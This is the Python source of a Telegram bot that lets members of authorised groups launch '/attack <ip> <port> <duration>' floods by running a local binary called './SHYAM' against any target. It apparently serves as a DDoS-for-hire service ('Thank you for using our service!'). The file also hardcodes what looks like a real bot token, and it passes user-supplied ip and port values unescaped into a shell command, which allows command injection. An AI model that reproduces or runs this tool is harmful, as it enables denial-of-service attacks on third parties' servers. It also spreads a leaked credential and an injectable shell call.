import os
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# Replace with your bot token
TELEGRAM_BOT_TOKEN = '7289992579:AAEaDnFhijT2CbZfTKtmrCtdl_uAypGUSuI'

# Predefined list of authorized group IDs (replace these with actual group IDs)
AUTHORIZED_GROUPS = {-1002358927911, -1002409757185}  # Add your group IDs here

# Check if the group is authorized
def is_group_authorized(chat_id):
    return chat_id in AUTHORIZED_GROUPS

# Command: Start
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if not is_group_authorized(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="❌ This group is not authorized to use the bot.")
        return

    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Command: Run Attack
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./SHYAM {ip} {port} {duration} 05",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

# Command: Attack
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if not is_group_authorized(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="❌ This group is not authorized to use the bot.")
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    try:
        duration = int(duration)
        if duration > 240:
            await context.bot.send_message(chat_id=chat_id, text="⚠️ *Maximum duration is 240, please choose a shorter duration.*", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Invalid duration. Please enter a number.*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

# Main Function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == '__main__':
    main()
